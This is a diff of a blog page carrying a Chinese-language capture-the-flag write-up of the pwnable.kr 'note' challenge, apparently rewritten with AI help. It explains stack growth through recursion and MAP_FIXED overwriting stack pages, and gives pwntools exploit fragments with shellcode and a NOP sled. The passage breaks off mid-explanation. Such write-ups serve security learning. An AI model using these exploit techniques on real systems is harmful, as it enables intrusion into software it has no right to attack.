@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../../" aria-busy="true">
   <a href="../../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../../"
          data-navigation-hidden="false">
       
@@ -787,30 +787,92 @@
   
 
 
+<!-- blog-edit-start:f3f39d50fdec694c:b0 -->
+
 <h1 id="pwnablekr-note">Pwnable.kr Note</h1>
+<!-- blog-edit-end:f3f39d50fdec694c:b0 -->
+
 <div class="file-actions" data-image-edit-revision="f3f39d50fdec694c7145b54df83afaead5f8ef205f5d50730f2022d54ee2555b" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote%5C35.note.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\35.note.md">复制路径</span></div>
 
+<!-- blog-edit-start:f3f39d50fdec694c:b1 -->
+
 <h2 id="_1">个人前言</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b1 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b2 -->
+
 <p>大概在五年之前的组会上做出来的一道题目，无意间点到这篇文章，发现写的很不好，完全看不懂了。于是就直接把源码、自己的脚本、当时写的笔记甩给 GPT5.5，让他来重新总结。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b2 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b3 -->
+
 <p>不得不说，真是吊打我啊，写的比我的好多了，看了一会就立马懂了。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b3 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b4 -->
+
 <p>除了这个章节剩下的全是 AI 写的，我完全不需要修改，期间只问了他一个疑问，然后让他多做了一次调整。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b4 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b5 -->
+
 <p>当时写的笔记的开头，怀念，居然五年多了：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b5 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b6 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos="1 "></span>竟然在开组会的时候不小心写出来了，感谢无私分享解法的一位外国小哥。
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b6 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b7 -->
+
 <h2 id="_2">前言</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b7 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b8 -->
+
 <p>这题的关键不在于单个传统栈溢出，而在于几个看似“不够致命”的点组合在一起：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b8 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b9 -->
+
 <ul>
 <li>程序关闭 ASLR，栈地址相对固定。</li>
 <li><code>select_menu()</code> 反复递归调用自身，导致栈持续向低地址增长。</li>
 <li><code>mmap_s()</code> 使用 <code>MAP_FIXED</code> 强行映射随机地址，可能覆盖已有映射。</li>
 <li>note 页是 <code>RWX</code>，并且创建后会把映射地址打印出来。</li>
 </ul>
+<!-- blog-edit-end:f3f39d50fdec694c:b9 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b10 -->
+
 <p>最终思路是：先让递归不断压栈，再等待一次 <code>mmap_s()</code> 正好把 note 映射到当前栈区间内。由于 <code>MAP_FIXED</code> 会覆盖原有栈页，我们就可以把某段栈内容改成 shellcode 地址。之后程序退出或返回时，递归调用开始一层层 <code>leave; ret</code>，最终控制流会跳到 shellcode。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b10 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b11 -->
+
 <h2 id="_3">程序功能</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b11 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b12 -->
+
 <p>程序维护了一个全局指针数组：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b12 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b13 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">mem_arr</span><span class="p">[</span><span class="mi">257</span><span class="p">];</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b13 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b14 -->
+
 <p>用户可以创建、写入、读取、删除 note。创建 note 时，程序调用 <code>mmap_s()</code> 映射一页内存，并把地址打印出来：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b14 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b15 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">create_note</span><span class="p">(){</span>
 </span><span id="__span-2-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
 </span><span id="__span-2-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">    </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span>
@@ -828,12 +890,28 @@
 </span><span id="__span-2-15"><span class="linenos" data-linenos="15 "></span><span class="w">    </span><span class="k">return</span><span class="p">;</span>
 </span><span id="__span-2-16"><span class="linenos" data-linenos="16 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b15 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b16 -->
+
 <p>这里有两个很重要的利用条件：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b16 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b17 -->
+
 <ol>
 <li>创建出来的 note 页具有 <code>PROT_READ | PROT_WRITE | PROT_EXEC</code> 权限，可以直接放 shellcode。</li>
 <li>程序会泄露每个 note 的实际映射地址，方便脚本判断这次映射是否命中了目标区域。</li>
 </ol>
+<!-- blog-edit-end:f3f39d50fdec694c:b17 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b18 -->
+
 <p>写 note 时使用的是 <code>gets()</code>：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b18 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b19 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">write_note</span><span class="p">(){</span>
 </span><span id="__span-3-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">no</span><span class="p">;</span>
 </span><span id="__span-3-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;note no?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
@@ -851,9 +929,25 @@
 </span><span id="__span-3-15"><span class="linenos" data-linenos="15 "></span><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">mem_arr</span><span class="p">[</span><span class="n">no</span><span class="p">]);</span>
 </span><span id="__span-3-16"><span class="linenos" data-linenos="16 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b19 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b20 -->
+
 <p>因为每个 note 页大小是 <code>0x1000</code>，脚本写入的数据不超过这一页即可。真正决定能否利用的不是这里的 <code>gets()</code> 溢出，而是我们能否让某个 note 页映射到栈上。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b20 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b21 -->
+
 <h2 id="secret-menu-1">误导点：Secret Menu 的 1 字节溢出</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b21 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b22 -->
+
 <p>菜单里有一个隐藏选项：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b22 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b23 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">select_menu</span><span class="p">(){</span>
 </span><span id="__span-4-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">menu</span><span class="p">;</span>
 </span><span id="__span-4-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">command</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
@@ -873,25 +967,85 @@
 </span><span id="__span-4-17"><span class="linenos" data-linenos="17 "></span><span class="w">    </span><span class="n">select_menu</span><span class="p">();</span>
 </span><span id="__span-4-18"><span class="linenos" data-linenos="18 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b23 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b24 -->
+
 <p><code>command</code> 只有 1024 字节，但 <code>fgets(command, 1025, stdin)</code> 最多会写入 1024 个输入字符和 1 个字符串结束符，因此存在 1 字节溢出。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b24 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b25 -->
+
 <p>不过这个点单独看并不好用。实际调试可以看到，这 1 字节主要影响附近的局部变量，例如 <code>menu</code> 的低字节。可是当前这轮 <code>switch</code> 已经执行完，函数马上再次调用 <code>select_menu()</code> 进入下一轮菜单，因此这个 1 字节覆盖很难直接劫持控制流。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b25 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b26 -->
+
 <p>它更像是题目给出的提示：真正要关注的是 <code>select_menu()</code> 的递归结构，以及不断增长的栈。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b26 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b27 -->
+
 <h2 id="_4">关键点一：递归菜单导致栈持续下降</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b27 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b28 -->
+
 <p><code>select_menu()</code> 在函数末尾再次调用自己：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b28 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b29 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos="1 "></span><span class="n">select_menu</span><span class="p">();</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b29 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b30 -->
+
 <p>如果编译器没有做尾调用优化，那么每次选择菜单后都会创建一个新的栈帧，旧的栈帧不会释放。x86 的栈从高地址向低地址增长，所以每次递归都会让当前栈顶继续降低。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b30 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b31 -->
+
 <p>在调试环境中，可以观察到每进入一次新的 <code>select_menu()</code>，栈大约下降：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b31 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b32 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos="1 "></span>0x430
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b32 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b33 -->
+
 <p>这也是 exploit 中的常量：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b33 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b34 -->
+
 <div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><span class="linenos" data-linenos="1 "></span><span class="n">one_stack_offset</span> <span class="o">=</span> <span class="mh">0x430</span>
 </span><span id="__span-7-2"><span class="linenos" data-linenos="2 "></span><span class="n">ebp_start</span> <span class="o">=</span> <span class="mh">0xffffdc08</span>
 </span><span id="__span-7-3"><span class="linenos" data-linenos="3 "></span><span class="n">esp_start</span> <span class="o">=</span> <span class="mh">0xffffd7e0</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b34 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b35 -->
+
 <p>于是，随着菜单循环次数增加，活跃栈区间会不断变大。由于题目环境不开 ASLR，初始栈地址稳定，我们可以在脚本里估算当前递归深度对应的栈范围。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b35 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b36 -->
+
 <h2 id="map_fixed">关键点二：<code>MAP_FIXED</code> 可以覆盖已有映射</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b36 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b37 -->
+
 <p>题目自定义了一个所谓“安全”的 <code>mmap_s()</code>：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b37 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b38 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-8-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">mmap_s</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">prot</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">off_t</span><span class="w"> </span><span class="n">offset</span><span class="p">){</span>
 </span><span id="__span-8-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">addr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="p">(</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">MAP_FIXED</span><span class="p">)</span><span class="w"> </span><span class="p">){</span>
 </span><span id="__span-8-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">        </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">tmp</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
@@ -916,31 +1070,95 @@
 </span><span id="__span-8-22"><span class="linenos" data-linenos="22 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">mmap</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="n">prot</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">offset</span><span class="p">);</span>
 </span><span id="__span-8-23"><span class="linenos" data-linenos="23 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b38 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b39 -->
+
 <p>它的本意是从 <code>/dev/urandom</code> 取一个随机地址，然后按页对齐，并强制设置最高位，让地址落在高地址区域。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b39 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b40 -->
+
 <p>问题在于：它调用 <code>mmap()</code> 时加了 <code>MAP_FIXED</code>。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b40 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b41 -->
+
 <p><code>MAP_FIXED</code> 的语义非常危险：如果目标地址已经存在映射，内核会先取消原映射，再把新映射放到这个地址。因此，当随机地址落到栈区间时，<code>mmap_s()</code> 就会把对应的栈页替换成一页新的 <code>RWX</code> note 内存。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b41 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b42 -->
+
 <p>这意味着我们拿到的不只是普通 note，而是“覆盖到栈上的 note”。之后通过 <code>write_note()</code> 写这个 note，本质上就是在写那段栈内存。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b42 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b43 -->
+
 <h2 id="_5">利用目标</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b43 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b44 -->
+
 <p>利用时需要两块 note：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b44 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b45 -->
+
 <ol>
 <li>一块普通 note，用来存放 shellcode。</li>
 <li>一块命中栈区间的 note，用来把栈内容覆盖成 shellcode 地址。</li>
 </ol>
+<!-- blog-edit-end:f3f39d50fdec694c:b45 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b46 -->
+
 <p>因为程序会打印每次创建 note 的地址，所以脚本可以不断创建 note，并检查返回地址是否落在我们估算的栈区间内：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b46 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b47 -->
+
 <div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><span class="linenos" data-linenos="1 "></span><span class="k">if</span> <span class="p">(</span><span class="n">this_addr</span> <span class="o">&lt;</span> <span class="n">ebp_start</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">this_addr</span> <span class="o">&gt;</span> <span class="n">stack_addr</span><span class="p">):</span>
 </span><span id="__span-9-2"><span class="linenos" data-linenos="2 "></span>    <span class="n">note_in_stack</span> <span class="o">=</span> <span class="p">(</span><span class="n">this_no</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">this_addr</span><span class="p">))</span>
 </span><span id="__span-9-3"><span class="linenos" data-linenos="3 "></span>    <span class="k">break</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b47 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b48 -->
+
 <p>这里的 <code>ebp_start</code> 是初始栈帧附近的高地址边界，<code>stack_addr</code> 是根据递归次数估算出来的当前低地址边界。只要 <code>this_addr</code> 落在这个区间，说明这次 <code>mmap_s()</code> 映射到了当前活跃栈区域。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b48 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b49 -->
+
 <p>选择这个区间的原因是：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b49 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b50 -->
+
 <ul>
 <li>栈从高地址向低地址增长。</li>
 <li>当前递归越深，已经占用的栈范围越大。</li>
 <li>只要 note 映射到当前栈顶以上、初始栈附近以下的位置，就有机会覆盖未来返回过程中会被使用到的栈数据。</li>
 </ul>
+<!-- blog-edit-end:f3f39d50fdec694c:b50 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b51 -->
+
 <h2 id="_6">利用流程</h2>
+<!-- blog-edit-end:f3f39d50fdec694c:b51 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b52 -->
+
 <h3 id="1-note">1. 不断创建 note，等待命中栈区间</h3>
+<!-- blog-edit-end:f3f39d50fdec694c:b52 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b53 -->
+
 <p>脚本每次调用 <code>create_one()</code>，都会进入一层新的菜单递归，并获得新 note 的编号和地址：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b53 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b54 -->
+
 <div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><span class="linenos" data-linenos="1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">create_one</span><span class="p">():</span>
 </span><span id="__span-10-2"><span class="linenos" data-linenos="2 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;5. exit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 </span><span id="__span-10-3"><span class="linenos" data-linenos="3 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
@@ -949,44 +1167,132 @@
 </span><span id="__span-10-6"><span class="linenos" data-linenos="6 "></span>    <span class="n">this_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span> <span class="p">)</span>
 </span><span id="__span-10-7"><span class="linenos" data-linenos="7 "></span>    <span class="k">return</span> <span class="p">(</span><span class="n">this_no</span><span class="p">,</span> <span class="n">this_addr</span><span class="p">)</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b54 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b55 -->
+
 <p>如果这次映射地址没有落到栈区间，就继续创建。同时根据递归深度更新当前估算的栈低地址：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b55 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b56 -->
+
 <div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><span class="linenos" data-linenos="1 "></span><span class="k">if</span> <span class="p">(</span><span class="n">this_no</span> <span class="o">==</span> <span class="mi">255</span><span class="p">):</span>
 </span><span id="__span-11-2"><span class="linenos" data-linenos="2 "></span>    <span class="n">delete_all</span><span class="p">()</span>
 </span><span id="__span-11-3"><span class="linenos" data-linenos="3 "></span>    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="n">one_stack_offset</span> <span class="o">*</span> <span class="mi">256</span>
 </span><span id="__span-11-4"><span class="linenos" data-linenos="4 "></span><span class="k">else</span><span class="p">:</span>
 </span><span id="__span-11-5"><span class="linenos" data-linenos="5 "></span>    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="n">one_stack_offset</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b56 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b57 -->
+
 <p>由于 <code>mem_arr</code> 最多保存 256 个 note，编号达到 255 后需要先删除所有 note，再继续尝试。删除 note 本身也会经过菜单递归，因此脚本同样要把这部分带来的栈下降计入 <code>stack_addr</code>。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b57 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b58 -->
+
 <h3 id="2-shellcode-note">2. 创建 shellcode note</h3>
+<!-- blog-edit-end:f3f39d50fdec694c:b58 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b59 -->
+
 <p>一旦找到了命中栈区间的 note，就再创建一个普通 note，用来放 shellcode：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b59 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b60 -->
+
 <div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><span class="linenos" data-linenos="1 "></span><span class="n">note_in_shell</span> <span class="o">=</span> <span class="n">create_one</span><span class="p">()</span>
 </span><span id="__span-12-2"><span class="linenos" data-linenos="2 "></span><span class="n">shellcode</span> <span class="o">=</span> <span class="mi">160</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
 </span><span id="__span-12-3"><span class="linenos" data-linenos="3 "></span><span class="n">write_one</span><span class="p">(</span><span class="n">note_in_shell</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">)</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b60 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b61 -->
+
 <p>这里前面放了一段 NOP sled，降低跳转误差带来的影响。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b61 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b62 -->
+
 <h3 id="3-note">3. 覆盖栈 note</h3>
+<!-- blog-edit-end:f3f39d50fdec694c:b62 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b63 -->
+
 <p>最后，把命中栈区间的 note 写满 shellcode note 的地址：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b63 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b64 -->
+
 <div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><span class="linenos" data-linenos="1 "></span><span class="n">write_one</span><span class="p">(</span><span class="n">note_in_stack</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">p32</span><span class="p">(</span><span class="n">note_in_shell</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b64 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b65 -->
+
 <p>这一步的效果是：把某段活跃栈内存改成大量相同的地址。之后当程序开始从递归调用中返回时，某一次 <code>ret</code> 会从这片被覆盖的栈中取返回地址，于是跳到 shellcode note。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b65 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b66 -->
+
 <p>这里的“从递归调用中返回”是由菜单里的退出选项触发的。源码中 <code>5. exit</code> 对应的逻辑如下：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b66 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b67 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-14-1"><span class="linenos" data-linenos="1 "></span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span>
 </span><span id="__span-14-2"><span class="linenos" data-linenos="2 "></span><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;bye</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
 </span><span id="__span-14-3"><span class="linenos" data-linenos="3 "></span><span class="w">    </span><span class="k">return</span><span class="p">;</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b67 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b68 -->
+
 <p>但是程序的菜单不是普通 <code>while</code> 循环，而是在每次处理完菜单后递归调用自己：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b68 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b69 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-15-1"><span class="linenos" data-linenos="1 "></span><span class="n">select_menu</span><span class="p">();</span>
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b69 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b70 -->
+
 <p>所以调用关系大致是：</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b70 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b71 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><span class="linenos" data-linenos="1 "></span>select_menu 第 1 层
 </span><span id="__span-16-2"><span class="linenos" data-linenos="2 "></span>  -&gt; select_menu 第 2 层
 </span><span id="__span-16-3"><span class="linenos" data-linenos="3 "></span>    -&gt; select_menu 第 3 层
 </span><span id="__span-16-4"><span class="linenos" data-linenos="4 "></span>      -&gt; ...
 </span></code></pre></div>
+<!-- blog-edit-end:f3f39d50fdec694c:b71 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b72 -->
+
 <p>当我们在最深的一层选择 <code>5</code> 时，当前这一层 <code>select_menu()</code> 会 <code>return</code>。返回到上一层后，上一层的 <code>select_menu()</code> 调用点后面也没有其他逻辑，于是上一层也会继续返回。这个过程会一直向外层展开。</p>
+<!-- blog-edit-end:f3f39d50fdec694c:b72 -->
+
+<!-- blog-edit-start:f3f39d50fdec694c:b73 -->
+
